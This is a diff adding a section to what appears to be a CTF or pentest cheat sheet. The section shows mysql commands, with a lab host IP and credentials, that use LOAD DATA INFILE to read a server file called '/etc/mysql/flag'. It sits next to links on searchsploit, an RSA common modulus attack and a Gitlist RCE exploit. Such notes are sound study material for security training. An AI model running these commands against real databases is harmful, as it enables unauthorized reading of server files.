@@ -350,6 +350,19 @@ searchsploit postgreesql
 ### Common Modulus attack with extended Euclidean algorithm: [here](https://blog.0daylabs.com/2015/01/17/rsa-common-modulus-attack-extended-euclidean-algorithm/)
 
 
+### Read file using mysql
+
+```bash
+
+# Create table
+mysql kingslanding -h 192.168.56.101 -ucerseilannister -p_g0dsHaveNoMercy_ -e "create table Flag (flag varchar(500));"
+
+# load informations from file to that table
+mysql kingslanding -h 192.168.56.101 -ucerseilannister -p_g0dsHaveNoMercy_ -e "load data infile '/etc/mysql/flag' into table Flag;"
+
+# You will get an error that will display the content of that file
+```
+
 ### Exploits
 
 #### Gitlist - [Source](http://hatriot.github.io/blog/2014/06/29/gitlist-rce/)
